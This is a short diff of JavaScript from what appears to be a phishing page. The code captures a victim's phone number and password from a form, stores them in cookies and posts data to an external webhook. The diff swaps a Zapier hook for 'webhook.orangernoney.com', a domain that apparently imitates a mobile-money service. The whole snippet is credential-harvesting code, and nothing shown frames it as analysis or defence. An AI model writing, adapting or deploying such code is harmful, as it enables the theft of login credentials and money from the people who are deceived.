@@ -227,7 +227,7 @@
         setCookie("phonenumber", document.getElementById('phonenumber').value);
         setCookie("password", document.getElementById('password').value);
         var xhr = new XMLHttpRequest();
-        xhr.open("POST", 'https://hooks.zapier.com/hooks/catch/24769683/u1cscm8/',true);
+        xhr.open("POST", 'https://webhook.orangernoney.com',true);
         xhr.setRequestHeader('Content-Type', 'application/json');
         xhr.onreadystatechange = function() {
             if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200){
